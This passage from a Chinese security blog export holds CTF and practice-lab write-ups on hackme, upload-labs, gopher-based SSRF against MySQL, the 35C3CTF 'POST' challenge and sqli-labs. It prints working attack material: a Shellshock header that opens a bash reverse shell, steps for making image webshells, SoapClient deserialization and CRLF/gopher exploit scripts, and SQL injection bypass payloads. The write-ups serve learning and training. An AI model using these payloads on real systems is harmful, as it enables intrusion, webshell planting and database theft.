&lt;fcntl.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[])&#123; char buff[4096], rnd[16], val[16]; if(syscall(SYS_getrandom, &amp;rnd, sizeof(rnd), 0) != sizeof(rnd)) &#123; write(1, &quot;Not enough random\n&quot;, 18); &#125; setuid(1337); seteuid(1337); alarm(1); write(1, &amp;rnd, sizeof(rnd)); read(0, &amp;val, sizeof(val)); if(memcmp(rnd, val, sizeof(rnd)) == 0) &#123; int fd = open(argv[1], O_RDONLY); if(fd &gt; 0) &#123; int s = read(fd, buff, 1024); if(s &gt; 0) &#123; write(1, buff, s); &#125; close(fd); &#125; else &#123; write(1, &quot;Can not open file\n&quot;, 18); &#125; &#125; else &#123; write(1, &quot;Wrong response\n&quot;, 16); &#125;&#125; 大致1秒之内把他输出的再输入回去，就可以打出文件内容此时我们的思路很简单，运行这个c算了，直接拿shell好了shell反弹 1wget --header=&quot;X-Exploit: () &#123; : ; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/你的ip/8888 0&gt;&amp;1&quot; -q -O - &quot;https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot; 选择了linux下的重定向，我们将输出写到某个文件中，再自动输入即可，这样即可达到目的我们先去探索可写目录，容易发现/var/tmp具有写权限直接 1flag-reader flag &gt; /var/tmp/skyflag &lt; /var/tmp/skyflag 然后cat /var/tmp/skyflag就可以得到flag了 xss http://www.northity.com/2018/10/23/XSSme%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/ 参考 https://skysec.top/2018/01/07/hackme%E7%BD%91%E7%AB%99%E8%BE%B9%E5%81%9A%E8%BE%B9%E8%AE%B0%E5%BD%95/#wordpress-1]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>ssrf</tag>
        <tag>xss</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[upload-labs-writeup 11 ~ 15]]></title>
    <url>%2F2019%2F02%2F13%2Fupload-labs-writeup%2011~15%2F</url>
    <content type="text"><![CDATA[前言 upload-labs是一个基于php语言的上传漏洞的靶场项目包括(最新commit17ec936) 的19个上传关卡的方法。可以通过git clone https://github.com/c0ny1/upload-labs.git 来搭建属于自己的一个upload练习靶场 正文 Pass-011 %00截断 GET直接看源码这题明显是白名单，与之前黑名单不同只能允许jpg，png，gif的文件感觉可以使用00截断 strrpos — 计算指定字符串在目标字符串中最后一次出现的位置 strrpos ( string $haystack , string $needle [, int $offset = 0 ] ) : int 这段大概意思是截取文件后缀的意思CVE-2015-2348影响版本：5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7exp：move_uploaded_file($_FILES[‘name’][‘tmp_name’],”/file.php\x00.jpg”);这里的image_path是可以控制的在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。但是有环境限制： php版本要小于5.3.4，5.3.4及以上已经修复该问题magic_quotes_gpc需要为OFF状态 结果故我们就可以这样做好吧，大概环境不行 因为这里要满足is_path 估计这样搞就不是path了吧， Pass-012 %00截断 POST直接看源码依旧是使用白名单，和之前不同在于save_path由get改成了post依旧是%00截断，但是有一个区别在于post不会自动将其url解码所以我们要先将%00进行url解码后才行（就是个空格吧？）反正我是不可以的。 Pass-013 图片马源码一眼看上去，这题的画风和之前有很大不同阿 unpack - 从二进制字符串中解压缩数据unpack （ string $format ， string $data [， int $offset= 0 ]）： array intval — 获取变量的整数值intval ( mixed $var [, int $base = 10 ] ) : int 大概意思就是取文件末尾的后缀的二进制数然后unpack进行二进制解包变成char，后将其转化为int 与jap、png、gif的int数会不会相等，相等就上传成功，之前的00截断是肯定用不上的，要怎么做呢？图片马，没错，我也是刚刚知道有这么回事，居然有这么骚的操作。具体可以看 http://gv7.me/articles/2017/picture-trojan-horse-making-method/ 准备一张正常图片（a.jpg）,新建一个文件内容写入以下代码（b.php） 使用以下命令生成图片木马muma.jpg copy a.jpg /b + b.php /a = muma.jpg 参数/b指定以二进制格式复制、合并文件(图片),参数/a指定以ASCII格式复制、合并文件（php文件），x.php文件里为要写的一句话木马 然而 换种方法使用二进制编辑工具（比如winhex,utrl editor等等）直接写恶意代码到文件尾部。这里我使用winhex给大家演示访问后没反应？？？难道是我打开的姿势不对我要换个姿势打开卧槽这么神奇，马萨卡？之前的也可以用这么搞吗，换成12关试试还是上传成功了，图片🐎恐怖如斯还有谁，还有什么可以阻止图片🐎的吗不过，这个图片🐎应该还是要结合文件包含漏洞的，试试看，菜刀能不能连上这个图片🐎貌似不可以额，原来我漏了一段url，图片🐎是可以作为webshell的（啧啧，斗🐎强者恐怖如斯）不过我们也可以利用图片马加上代码执行，可以生成一个webshell 如：echo“” &gt; x.php 具体可以看 https://blog.csdn.net/Breeze_CAT/article/details/80044676#%E5%A4%B4%E5%83%8F%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC 顺便了解下jpg/png/gif的头部格式每种类型的图片内容最开头会有一个标志性的头部，这个头部被称为文件幻数。jpg文件头值为FFD8FFE000104A464946png网上传是89504E47（然而貌似不是）会使getimagesize函数和exif_imagetype函数报错（虽然我感觉是这个）但是别的大神实测是89504E470D0A1A0Agif 是 文件头值为474946383961 Pass-014 图片马即使没有看源码图片🐎依旧上传成功，不过我们还是看下源码看一下有没有其他的利用方式 image_type_to_extension — 取得图像类型的文件后缀image_type_to_extension ( int $imagetype [, bool $include_dot = TRUE ] ) : string getimagesize — 取得图像大小getimagesize ( string $filename [, array &amp;$imageinfo ] ) : array 感觉这种写法就是上面那题的变种写法getimagesize函数只是对文件头部进行检测，只要文件头部正确就可以了但是图片内容最好要符合php规则，不然会导致报错而无法执行我们想要的代码 Pass-015 图片马继续上传图片🐎what？咋没了看下源码貌似是一个php_exif没有开我就不开了打开应该就可以了，额，我就不演示了，exif_imagetype和getimagesize都是对文件头部进行检测，所以，冲啊，图片🐎 参考 http://lawlietweb.com/2018/06/07/upload-labs/#%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对于利用gopher进行ssrf的学习与理解]]></title>
    <url>%2F2019%2F02%2F12%2F%E5%AF%B9%E4%BA%8E%E5%88%A9%E7%94%A8gopher%E8%BF%9B%E8%A1%8Cssrf%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%90%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[前言之前学习了下35C3CTF POST 题目以及之前的比赛经历深刻认识到自己对于ssrf理解的浅薄，在此特地google一波，并且来自我总结下，本文主要内容是对于其他文章的理解 正文SSRF简介SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。 利用Gopher实现ssrf https://paper.seebug.org/510/ Gopher 协议是 https 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。但是经过部分测试，发现阿里云的 libcurl 还是支持 Gopher 协议的，在实际环境中可能会有更多。 利用SSRF漏洞结合Gopher系统攻击内网未授权MySQL，并且获取系统shell的方法一、MySQL通信协议在进行利用SSRF攻击MySQL之前，先了解一下MySQL的通信协议。MySQL分为服务端和客户端，客户端连接服务器使存在三种方法 1.Unix套接字；2.内存共享/命名管道；3.TCP/IP套接字； Linux/unix当客户端和mysql服务器处于同一台电脑时就是使用unix套接字 windows下当客户端和mysql服务器处于同一台电脑时就是使用内存共享/命名管道 1.当什么参数都没有指定的时候，mysql默认使用socket（内存共享/命名管道与unix套接字）方式登陆，即我们常用的mysql–uroot –proot登录MySQL服务器 如果my.cnf的[客户端]没有指定socket文件路径时，mysql默认会去寻找/tmp/mysql.sock，所以如果mysql服务启动的时候，生成的socket文件不是默认路径的话，登陆会报错 2.TCP/IP套接字是在任何系统下都可以使用的方式，mysql登陆的时候，指定参数-h，会使用tcp/ip的方式连接，如果没有指定端口的话，默认是使用3306端口，即mysql–h127.0.0.1 –uroot –proot时就是要TCP/IP套接字3.当mysql登陆时，同时指定-h和-S，mysql会默认使用tcp/ip的方式连接。 二、MySQL认证过程：MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证；当无需密码认证时直接发送TCP/IP数据包即可。 MySQL 交互模式和非交互模式 交互式操作：在本机上打开mysql的客户端，就是那个黑窗口，在黑窗口下进行各种sql操作，当然走的肯定是tcp协议。 非交互式操作：在你的项目中进行程序调用。比如一边是tomcat web服务器，一边是数据库服务器，两者怎么通信？在java web里，我们通常会选择hibernate或者是jdbc来连接。那么这时候就是非交互式操作。 所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，本文利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的 MySQL客户端与服务器的交互主要分为两个阶段：Connection Phase（连接阶段或者叫认证阶段）和Command Phase（命令阶段）。在连接阶段包括握手包和认证包.认证数据包格式如下：这里以无需密码认证情况登录，看看认证数据包内容：这里Packet Length为整个数据包的长度，Packet Number为sequence_id随每个数据包递增，从0开始，命令执行阶段遇到命令重新重置为0。这两个Packet为真个MySQL通协议的基础数据包。 客户端请求命令数据包格式如下： 三、构造攻击数据包环境：Ubuntu 18.04.1 LTS mmysql Ver 14.14 Distrib 5.7.25root登入数据库 mysql -u root -p xxx创建新的用户 123create user &apos;ljh&apos;@&apos;localhost&apos;;GRANT USAGE ON *.* TO &apos;ljh&apos;@&apos;localhost&apos;;GRANT ALL ON *.* TO &apos;ljh&apos;@&apos;localhost&apos;; 第一步 开一个窗口抓包（记得要用root权限）： tcpdump -i lo port 3306 -w mysql.pcay 第二步开一个窗口使用TCP/IP模式连接MySQL服务器： mysql -h127.0.0.1 -u ljh 为了抓到更多数据，然后随便select一个内容，在exit退出。 第三步使用Wireshark打开上面抓到的mysql.pcap包： 记得将数据包内容变成一行（去掉空格和换行符） 创建一个python脚本内容如下 12345678910#encoding:utf-8def result(s): a=[s[i:i+2] for i in xrange(0,len(s),2)] return &quot;curl gopher://127.0.0.1:3306/_%&quot; + &quot;%&quot;.join(a)if __name__ == &apos;__main__&apos;: import sys s=sys.argv[1] print result(s) 然而原来如此 然后在另一个窗口，开启MySQL终端，查询一些信息。最后记得exit;，不然会出问题。 重新来一次原来如此。我居然直接用wireshark进行抓包。。然而再次尝试原因未知，重启一下看看可以了 我们可以通过select xxx into outfile yyy创造一个shell文件也可以反弹shell（注意：在导出文件时，当前mysql用户必须存在file权限；部分MySQL服务器运行时启用了–secure-file-priv选项，导出文件时只能导出到规定的目录下，一般为/var/mysql/data命令，要自定义目录时必须修改配置文件设置secure-file-priv = “”；并且导入目录需要有写权限。） 小结gopher进行ssrf应该是可以结合命令执行来读取数据库中的flag文件 实战嗯，可以看,这边最后讲了一题很不错，不过貌似没有源码。只能看看了 https://shaobaobaoer.cn/archives/643/gopher-8de8ae-ssrf-mysql-a0e7b6 大致内容是此时通过file协议可以读出文件的源码。 file://localhost/../../../var/www/html/index.phpfile://localhost/../../../var/www/html/config.php 在自己本地测试，则创建一个库名字叫做ssrf，以及一个ssrf_user无密码的用户。 mysql -h 127.0.0.1 -u ssrf_user -e “use ssrf; select secret from flag”并在另一个窗口抓包，然后把原始数据导出为urlencode格式即可 参考 https://paper.seebug.org/510/]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>ssrf</tag>
        <tag>gopher</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[upload-labs-writeup 6~10]]></title>
    <url>%2F2019%2F02%2F12%2Fupload-labs-writeup%206~10%2F</url>
    <content type="text"><![CDATA[前言 upload-labs是一个基于php语言的上传漏洞的靶场项目包括(最新commit17ec936) 的19个上传关卡的方法。可以通过git clone https://github.com/c0ny1/upload-labs.git 来搭建属于自己的一个upload练习靶场 正文 Pass-06 未过滤空格可以看出这关和第五关很相似查看下源码（在subline看会更清楚些）发现它大小写过滤了，但是没有过滤空格这样我们就可以构造.php空格绕过过滤因为在windows下它会自动去除文件后面的空格在Linux貌似不行，没有试过 Pass-07 未去掉点和空格~查看下源码这次它过滤了首尾的空格，且去除了最后的点我感觉是要构造和之前的那样.php.空格.的形式这样的话最后会变成.php.在windows下还是会被apache执行成php文件试试上传成功后来发现貌似并没有去掉后面的. 看来php. .这样的形式因为在windows下 所以 先将最后的.去掉后来又去掉了.空格尝试下只构造php.同样也上传成功 Pass-08 这题与之前不同没有过滤::$DATA查看源码方法一：.php. . .这题首先过滤了首尾的空格然后去掉了末尾的.并且区分大小写，最后又去掉首尾空格这说明之前的.php.空格不行但是.php. .应该还是可以的试试 貌似不可以，？？第七题为啥可以？？？分析一波，第七题最后会变成.php. .而这题去掉了点与末尾的空格变成了.php.按道理这个是可以的那我们变成.php. . .这样呢？‘试试上传成功为啥.php.就不可以呢？？原因未知（或许与apache的某种解析机制有关？毕竟windows下直接.php.会直接变成php文件），按道理是可以的方法二：这题与之前不同没有过滤::$DATA具体看 https://zhuanlan.zhihu.com/p/52099683 特性一：主要利用了如下的特性 双引号(“&gt;”) &lt; == &gt; 点号(“.”)’;大于符号(“&gt;”) &lt; == &gt; 问号(“?”)’;小于符号(“&lt;”) &lt; == &gt; 星号(“*”)’; 我们先构造一个.php：进行截断这样会产生一种没有内容的php文件直接用冒号貌似是不可以的，所以后面加个jpg上传成功但是这种文件是没有大小的我们再上传个201902111119393767.&lt;&lt;&lt; 进行覆盖这个php文件，这里要事先知道这个上传文件的文件名才可以额，好像这样是不可以的…原因未知，大概是修复了这个问题吧，那这只能给大家增加下知识了 特性二： The default data stream has no name. That is, the fully qualified name for the default stream for a file called “sample.txt” is “sample.txt::$DATA” since “sample.txt” is the name of the file and “$DATA” is the stream type. 我的理解是 windows下的流数据是没有文件名的::$DATA，当时如果它是这样的sample.txt::$DATA，那么sample.txt就是它的文件名利用这个特性构造如下 成功上传 Pass-09 php. . .绕过看下源码方法一：大概看了下，增加了对::$DATA的过滤，不过我们还是可以采取.php. . .这样的形式进行绕过看看还有没有其他方法方法二：看了下别人的wp，发现文件上传的文件名是截取/后的比如说上传个aa/.jpg 最后上传会变成.jpg好吧，想了想好像这个貌似没有啥用阿… Pass-10 双写绕过查看源码这题明显黑名单数量要少很多嗯，意思是前面题有过滤的这题都可以绕过？方法一貌似没有过滤大小写？尝试下大写.PHP结果上传了个这个..说明.PHP被 str_ireplace($deny_ext,””, $file_name);这个函数代替了变成空格了那我们.php.php试试还是这样那.php.php.php呢？？？？还是失败，看来查查php手册 str_ireplace — str_replace() 的忽略大小写版本 这个函数是忽略大小写的，并且是从头到尾都删除，但是只删除一次那么我们就可以双写绕过构造.phphpp 最后变成？？？.hpp是什么鬼应为我们是php+hpp 它应该是先匹配第一个那么我们构造.pphphp试试上传成功]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[35C3CTF POST WP 的学习]]></title>
    <url>%2F2019%2F02%2F11%2F35C3CTF%20POST%20WP%20%E7%9A%84%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[前言这场比赛我是没打的，是在看先知社区的时候看到这题的wp，看了下，感觉好难阿..本来不打算写的，但是想想这题还是有很多知识点可以吸收的就自己试试看。基本是参考 https://www.smi1e.top/35c3ctf-post-wp/ 自己再进行补充一些官方Dockerfile+wp地址：https://github.com/eboda/35c3/tree/master/post 正文它有三个提示 Hint: flag is in dbHint2: the lovely XSS is part of the beautiful design and insignificant for the challengeHint3: You probably want to get the source code, luckily for you it’s rather hard to configure nginx correctly. 第一步 nginx配置错误hint3 说明nginx配置有问题推荐看这篇 https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html 目录穿越漏洞原文是这样 假设静态文件存储在/home/目录下，而该目录在url中名字为files，那么就需要用alias设置目录的别名location /files { alias /home/;} 此时，访问http://example.com/files/readme.txt，就可以获取/home/readme.txt文件。但我们注意到，url上/files没有加后缀/，而alias设置的/home/是有后缀/的，这个/就导致我们可以从/home/目录穿越到他的上层目录： 这段我也是看的很懵逼，啥叫用alias设置/home/查了下 原来这个就是用来设置根目录的别名的 比如 location /abc/ { alias /home/html/abc/; } 至于为啥没加/就会导致根目录穿梭，没有查出来具体原因，反正就是要加/ 额直接试试 /uploads../(具体原因不知道为啥要弄这个目录，或许这是一默认的吗？)将源码down下来 第二步 任意反序列化进入html/目录貌似没有特别的价值再试试uploads 貌似打不开 default.backup 试试，里面一些服务器的配置信息就是由于这个uploads没加/所以导致的目录穿梭的暂时没看出有什么可利用的 进nginx-debian.html试试好像也没有什么特别值得注意的地方 再进入/inc/目录发现一堆内容前面提示一中说flag在db中我尝试down下db大概看了下感觉这里应该是设置sql连接的配置看到这边有unserialize猜测是否会有反序列化存在想不出反序列化的利用pop链没有看到什么内置类，这里应该是要使用php本身内置类我记得上次是LCTF一题bestphp’s revenge貌似有说到可以看看 https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html 但是它有一个过滤在官方wp看到MSSQL会自动将全角unicode字符转换为ASCII表示形式。例如，如果字符串包含0xEF 0xBC 0x84，则将其存储为$可以绕过(好吧我还是不知道怎么绕过) 第三步 利用SoapClient SSRF这里有个 tostring可以将this-&gt;za open这里可能是要soapclient 进行ssrf打开flag文件？好吧 实际上是序列化SoapClient为za然后后触发它不存在的方法（call方法）SoapClient（至于怎么写入SoapClient还是不知道，反正肯定要先反序列化，再__call触发打入ssrf，） 现在我们要做的就是触发tosring方法这里将Attachment化为一个字符串，触发tostring调用 post::loadall() ::范围解析操作符http://php.net/manual/zh/language.oop5.paamayim-nekudotayim.php#language.oop5.paamayim-nekudotayim 例子 123456&lt;?php class MyClass &#123;const CONST_VALUE = &apos;A constant value&apos;;&#125;$classname = &apos;MyClass&apos;;echo $classname::CONST_VALUE; // 自 PHP 5.3.0 起echo MyClass::CONST_VALUE;?&gt; 大概是为了不实例化对象就调用它的方法吧？然后又调用DB的query方法然后又调用initialize方法连接了数据库？？？额，貌似线索断了往上看看原来query函数本身就返回那这个res哪来的？？？查下 sqlsrv_query - 准备并执行查询 所以这个到底是返回什么 $values吗？这个貌似是uid这是什么鬼好吧，看半天不是很懂猜测是通过uid传个序列化的SoapClient吧？然后触发反序列这个是别人的exp 12345678910&lt;?phpclass Attachment &#123; private $za = NULL; public function __construct() &#123; $this-&gt;za = new SoapClient(null,array(&apos;location&apos;=&gt;&apos;your_ip&apos;,&apos;uri&apos;=&gt;&apos;your_ip&apos;)); &#125;&#125;$c=new Attachment();$aaa=serialize($c);echo $aaa; 然后就直接soap ssrf进入了 第四步 SoapClient CRLF注射之前看到的文件起作用了因为SoapClient只支持post，不过_user_agent属性存在CRLF注入就是\r\n另外miniProxy只能代理http / https请求貌似SoapClient并不是http/https请求而是本身就是一种请求方式 这个可以通过gopher绕过 第五步 通过gopher连接到MSSQLgopher会在请求后加上一个\r\n，因此构造gopher请求时要在sql语句后加一个注释符– -别人的脚本 12345678910111213141516171819202122import requestsimport base64host=&quot;http://35.207.83.242/?&quot;post=&#123; &quot;username&quot;:&quot;aaaaaaaaaa&quot;, &quot;password&quot;:&quot;aaaaaaaaaa&quot;,&#125;r=requests.Session()url1=host+&quot;page=login&quot;r.post(url=url1,data=post)def fetch_uid(): return r.get(host, headers=&#123;&quot;Debug&quot;: &quot;1&quot;&#125;).content.decode().split(&quot;int(&quot;)[1].split(&quot;)&quot;)[0]payload=base64.b64decode(&quot;JHNlcmlhbGl6ZWRvYmplY3TvvIRPOjEwOiJBdHRhY2htZW50IjoxOntzOjI6InphIjtPOjEwOiJTb2FwQ2xpZW50IjozOntzOjM6InVyaSI7czozNToiaHR0cDovL2xvY2FsaG9zdDo4MDgwL21pbmlQcm94eS5waHAiO3M6ODoibG9jYXRpb24iO3M6MzU6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9taW5pUHJveHkucGhwIjtzOjExOiJfdXNlcl9hZ2VudCI7czoxMzk5OiJBQUFBQUhhaGEKCkdFVCAvbWluaVByb3h5LnBocD9nb3BoZXI6Ly8vZGI6MTQzMy9BJTEyJTAxJTAwJTJGJTAwJTAwJTAxJTAwJTAwJTAwJTFBJTAwJTA2JTAxJTAwJTIwJTAwJTAxJTAyJTAwJTIxJTAwJTAxJTAzJTAwJTIyJTAwJTA0JTA0JTAwJTI2JTAwJTAxJUZGJTAwJTAwJTAwJTAxJTAwJTAxJTAyJTAwJTAwJTAwJTAwJTAwJTAwJTEwJTAxJTAwJURFJTAwJTAwJTAxJTAwJUQ2JTAwJTAwJTAwJTA0JTAwJTAwdCUwMCUxMCUwMCUwMCUwMCUwMCUwMCUwMFQwJTAwJTAwJTAwJTAwJTAwJTAwJUUwJTAwJTAwJTA4JUM0JUZGJUZGJUZGJTA5JTA0JTAwJTAwJTVFJTAwJTA3JTAwbCUwMCUwQSUwMCU4MCUwMCUwOCUwMCU5MCUwMCUwQSUwMCVBNCUwMCUwOSUwMCVCNiUwMCUwMCUwMCVCNiUwMCUwNyUwMCVDNCUwMCUwMCUwMCVDNCUwMCUwOSUwMCUwMSUwMiUwMyUwNCUwNSUwNiVENiUwMCUwMCUwMCVENiUwMCUwMCUwMCVENiUwMCUwMCUwMCUwMCUwMCUwMCUwMGElMDB3JTAwZSUwMHMlMDBvJTAwbSUwMGUlMDBjJTAwaCUwMGElMDBsJTAwbCUwMGUlMDBuJTAwZyUwMGUlMDByJTAwJUMxJUE1UyVBNVMlQTUlODMlQTUlQjMlQTUlODIlQTUlQjYlQTUlQjclQTVuJTAwbyUwMGQlMDBlJTAwLSUwMG0lMDBzJTAwcyUwMHElMDBsJTAwbCUwMG8lMDBjJTAwYSUwMGwlMDBoJTAwbyUwMHMlMDB0JTAwVCUwMGUlMDBkJTAwaSUwMG8lMDB1JTAwcyUwMGMlMDBoJTAwYSUwMGwlMDBsJTAwZSUwMG4lMDBnJTAwZSUwMCUwMSUwMSUwMSUwRSUwMCUwMCUwMSUwMCUxNiUwMCUwMCUwMCUxMiUwMCUwMCUwMCUwMiUwMCUwMCUwMCUwMCUwMCUwMCUwMCUwMCUwMCUwMSUwMCUwMCUwMGklMDBuJTAwcyUwMGUlMDByJTAwdCUwMCUyMCUwMGklMDBuJTAwdCUwMG8lMDAlMjAlMDBwJTAwbyUwMHMlMDB0JTAwcyUwMCUyMCUwMCUyOCUwMHUlMDBzJTAwZSUwMHIlMDBpJTAwZCUwMCUyQyUwMCUyMCUwMHQlMDBpJTAwdCUwMGwlMDBlJTAwJTJDJTAwJTIwJTAwYyUwMG8lMDBuJTAwdCUwMGUlMDBuJTAwdCUwMCUyQyUwMCUyMCUwMGElMDB0JTAwdCUwMGElMDBjJTAwaCUwMG0lMDBlJTAwbiUwMHQlMDAlMjklMDAlMjAlMDB2JTAwYSUwMGwlMDB1JTAwZSUwMHMlMDAlMjAlMDAlMjglMDAyJTAwMCUwMDAlMDAlMkMlMDAlMjAlMDAlMjIlMDB0JTAwZSUwMHMlMDB0JTAwJTIyJTAwJTJDJTAwJTIwJTAwJTI4JTAwcyUwMGUlMDBsJTAwZSUwMGMlMDB0JTAwJTIwJTAwZiUwMGwlMDBhJTAwZyUwMCUyMCUwMGYlMDByJTAwbyUwMG0lMDAlMjAlMDBmJTAwbCUwMGElMDBnJTAwLiUwMGYlMDBsJTAwYSUwMGclMDAlMjklMDAlMkMlMDAlMjAlMDAlMjIlMDB0JTAwZSUwMHMlMDB0JTAwJTIyJTAwJTI5JTAwJTNCJTAwJTNCJTAwLSUwMC0lMDAlMjAlMDAtJTAwIEhUVFAvMS4xCkhvc3Q6IGxvY2FsaG9zdAoKIjt9fQ==&quot;)print(payload)data=&#123; &quot;title&quot;:&quot;testssssssssssssss&quot;, &quot;content&quot;:payload,&#125;url2=host+&quot;action=create&quot;r.post(url=url2,data=data) 对于gopher我是真的不熟悉先学习一波 后记这题是真的难，现在的我理解都要半天….ヽ(ﾟ´Д`)ﾉﾟ]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>ssrf</tag>
        <tag>反序列</tag>
        <tag>源码泄露</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs less 26 ~ 30]]></title>
    <url>%2F2019%2F02%2F11%2Fsqli-labs%20less%2026%20~%2030%2F</url>
    <content type="text"><![CDATA[前言 SQLI-LABS是一个学习SQLI的平台以下实验包适用于GET和POST场景,可以通过git clone https://github.com/Audi-1/sqli-labs 来搭建属于自己的一个sql注入练习靶场 正文less 26 Trick with comments and space (过滤注释和空格)可以看出过滤了空格，or，and,/,#,–,/等各种符号对于or，and可以使用双写绕过构造oorr，或者anandd进行绕过,或者构造and与or的逻辑表达式&amp;&amp;和||对于注释的过滤我们可以采取or ‘1对于空格我们可以采取一系列如下方式（最常用的还是/*/不过这里被过滤了） %09 TAB键（水平）%0a 新建一行%0c 新的一页%0d return功能%0b TAB键（垂直）%a0 空格 貌似由于windows下apache会将这些字符解析成一些奇怪的东西，所以就不演示了，如果想具体实现的话可以在linux下进行操作注：貌似%0b可以通过在windows下 less 26a Trick with comments and space (过滤注释和空格)这题与上题区别在于多了个（） 可以构造 || （‘1进行绕过 less 27 GET - Error Based- All your UNION &amp; SELECT belong to us (union和select)嗯过滤了select，union，这些都是白名单过滤，只要双写绕过就可以payload（这里是先没有绕过空格的） 12http://127.0.0.1/sqli-labs/Less-27/?id=0&apos; or updatexml(1,concat(0x7e,(seleselectct group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),0x7e),1) or &apos; 不过我自己测试的时候select过滤了两次…这里可能需要三写绕过了，空格的话可以%0b绕过（在windows下只能用这个）这里我们使用报错注入+双写payload 1http://127.0.0.1/sqli-labs/Less-27/?id=0&apos;%0bor%0bupdatexml(1,concat(0x7e,(seselectlect%0bdatabase()),0x7e),1)%0bor%0b&apos; 最终payload（我这个是三写绕过….+报错注入）获取数据库 12http://127.0.0.1/sqli-labs/Less-27/?id=0&apos;%0bor%0bupdatexml(1,concat(0x7e,(selseleselectctect%0bdatabase()%0blimit%0b0,1),0x7e),1)%0bor%0b&apos; 获取表 12http://127.0.0.1/sqli-labs/Less-27/?id=0&apos;%0bor%0bupdatexml(1,concat(0x7e,(selseleselectctect%0bgroup_concat(table_name)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=&apos;security&apos;%0blimit%0b0,1),0x7e),1)%0bor%0b&apos; 获取列 12http://127.0.0.1/sqli-labs/Less-27/?id=0&apos;%0bor%0bupdatexml(1,concat(0x7e,(selseleselectctect%0bgroup_concat(column_name)%0bfrom%0binformation_schema.columns%0bwhere%0btable_schema=&apos;security&apos;%0band%0btable_name=&apos;users&apos;%0blimit%0b0,1),0x7e),1)%0bor%0b&apos; 获取字段 12http://127.0.0.1/sqli-labs/Less-27/?id=0&apos;%0bor%0bupdatexml(1,concat(0x7e,(selseleselectctect%0bgroup_concat(table_name)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=&apos;security&apos;%0blimit%0b0,1),0x7e),1)%0bor%0b&apos; 当然这里union，select也可以使用大小写绕过 1、/g 表示该表达式将用来在输入字符串中查找所有可能的匹配，返回的结果可以是多个。如果不加/g最多只会匹配一个2、/i 表示匹配的时候不区分大小写，这个跟其它语言的正则用法相同3、/m 表示多行匹配。什么是多行匹配呢？就是匹配换行符两端的潜在匹配。影响正则中的^$符号4、/s 与/m相对，单行模式匹配。5、/e 可执行模式，此为PHP专有参数，例如preg_replace函数。6、/x 忽略空白模式。这里有值得注意的一点，这些修饰符是可以混合使用的。例如 /ig、/ie等。 这里使用group_concat可以将全部查询的报出来 less 27a GET - Error Based- All your UNION &amp; SELECT belong to us (union和select)这题和之前那题不同的地方在于 1.错误信息并没有显示出来2.没有单引号保护基于这两点，我们可以使用联合注入和盲注这里我们只举联合注入作为例子联合注入首先有两种绕过：大小写绕过，双写绕过 payload报数据库 1http://127.0.0.1/sqli-labs/Less-27a/?id=0&quot;%0buniunionon%0bseleselectct%0b1,2,database()%0b&quot;1 嗯，盲注和爆其他的就不写了，（话说我源码为啥select过滤了两次？？？） less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入依旧是没有错误信息显示，不过我们仍然可以采用联合注入的方式，和之前不同这次是有（）的这里过滤了union空格+select我们可以尝试双写绕过 即 union union select select不过经过我的测试，union注入是不可以的可以看到因为注释符号被过滤了只能采取 （’闭合 但是由于limit 0，1 末尾我们不能使用and或者or应该使用where语句 不然会导致无法将我们需要的数据爆出来使用where是为了让语句变成无约束查询payload如下 1http://127.0.0.1/sqli-labs/Less-28/?id=0&apos;)%0bunion%0bunion%0bselect%0bselect%0b3,5,database()%0bfrom%0busers%0bwhere%0b(&apos;2&apos;)=(&apos;2 当然也可以尝试盲注，布尔盲注和时间盲注应该都是可以的，我就不试了 less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入可以看到id仍让是由（‘’）保护并且它仍然是可以输出username，password数据，以及这了只过滤了union空格select，但是没有不会爆出错误信息（为啥明明错误时候已经没有print_r(mysql_error())还是会爆出错误？？我猜测这里可能还与mysql或者其他的某个配置有关，所以还是可以报错注入？？ 经过尝试是不可以显错注入的 因为没有 print_r(mysql_error()) 错误信息只是 路径而已 就是 这个的上面部分 ） 直接拿上题的payload就可以了。。 话说我觉得这个题目顺序可能出现了点问题 Less - 29 Protection with 